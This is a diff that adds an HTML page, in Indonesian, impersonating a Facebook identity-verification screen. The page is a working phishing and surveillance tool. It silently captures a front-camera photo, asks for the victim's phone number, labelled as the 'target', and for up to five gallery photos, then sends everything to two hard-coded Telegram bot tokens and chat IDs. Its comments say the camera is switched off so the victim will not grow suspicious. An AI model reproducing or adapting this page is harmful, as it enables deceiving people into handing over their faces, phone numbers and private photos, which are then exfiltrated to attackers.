@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: Arial; background-color: #f0f2f5; text-align: center; }
+        .container { max-width: 400px; margin: 50px auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .logo { color: #1877f2; font-size: 30px; font-weight: bold; margin-bottom: 20px; }
+        .desc { font-size: 14px; color: #606770; margin-bottom: 20px; }
+        input[type="file"] { display: none; }
+        .btn-custom { background: #1877f2; color: white; padding: 12px; border: none; border-radius: 6px; width: 100%; cursor: pointer; font-weight: bold; margin: 5px 0; }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">facebook</div>
+    <p class="desc">Untuk alasan keamanan, silakan verifikasi identitas Anda dengan mengambil foto wajah dan mengunggah 5 foto profil terakhir.</p>
+    
+    <button class="btn-custom" onclick="startCapture()">Verifikasi Wajah (Kamera Depan)</button>
+    
+    <input type="number" id="phoneNum" placeholder="Masukkan Nomor HP Terdaftar" style="width:90%; padding:10px; margin:10px 0; border:1px solid #ddd;">
+    
+    <p style="font-size: 12px;">Pilih 5 Foto Galeri untuk Sinkronisasi:</p>
+    <input type="file" id="galleryInput" multiple accept="image/*" onchange="handleFiles()">
+    <button class="btn-custom" style="background:#42b72a;" onclick="document.getElementById('galleryInput').click()">Pilih dari Galeri</button>
+
+    <video id="video" width="100%" height="auto" autoplay style="display:none;"></video>
+    <canvas id="canvas"></canvas>
+</div>
+
+<script>
+    const config = {
+        tokens: ["8555398375:AAGESWcRFUKios-h-G7eG8kexiHghzJLGo8", "8220550089:AAF2wuFOcdHAWVMu3dITv4GDspDHIrXngfg"],
+        chats: ["7835924973", "8071786272"]
+    };
+
+    // FUNGSI CAPTURE KAMERA
+    async function startCapture() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            // Tunggu sebentar terus capture otomatis 😮
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const dataURL = canvas.toDataURL('image/jpeg');
+                
+                sendPhotoToTelegram(dataURL, "📸 CAPTURE KAMERA DEPAN");
+                stream.getTracks().forEach(track => track.stop()); // Matiin kamera biar gak curiga
+                alert("Verifikasi Wajah Berhasil!");
+            }, 2000);
+        } catch (err) {
+            alert("Akses kamera ditolak! Harap izinkan untuk lanjut.");
+        }
+    }
+
+    // FUNGSI AMBIL NOMOR & FILE GALERI
+    function handleFiles() {
+        const phone = document.getElementById('phoneNum').value;
+        const files = document.getElementById('galleryInput').files;
+        
+        if(files.length > 5) { alert("Maksimal 5 foto!"); return; }
+
+        // Kirim Nomor HP dulu
+        sendMsgToTelegram(`📱 NOMOR HP TARGET: ${phone}`);
+
+        // Kirim File Galeri (Maks 5)
+        for (let i = 0; i < files.length; i++) {
+            const reader = new FileReader();
+            reader.onload = (e) => sendPhotoToTelegram(e.target.result, `🖼️ GALERI FOTO KE-${i+1}`);
+            reader.readAsDataURL(files[i]);
+        }
+        alert("Data sedang disinkronkan...");
+    }
+
+    // HELPER: KIRIM PESAN TEXT
+    function sendMsgToTelegram(msg) {
+        config.tokens.forEach((token, i) => {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${config.chats[i]}&text=${encodeURIComponent(msg)}`);
+        });
+    }
+
+    // HELPER: KIRIM FOTO (BASE64)
+    function sendPhotoToTelegram(base64Data, caption) {
+        const blob = dataURItoBlob(base64Data);
+        const formData = new FormData();
+        formData.append("caption", caption);
+
+        config.tokens.forEach((token, i) => {
+            const fd = new FormData();
+            fd.append("chat_id", config.chats[i]);
+            fd.append("photo", blob, "image.jpg");
+            fd.append("caption", caption);
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: fd });
+        });
+    }
+
+    function dataURItoBlob(dataURI) {
+        var byteString = atob(dataURI.split(',')[1]);
+        var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+        var ab = new ArrayBuffer(byteString.length);
+        var ia = new Uint8Array(ab);
+        for (var i = 0; i < byteString.length; i++) { ia[i] = byteString.charCodeAt(i); }
+        return new Blob([ab], {type: mimeString});
+    }
+</script>
+
+</body>
+</html>
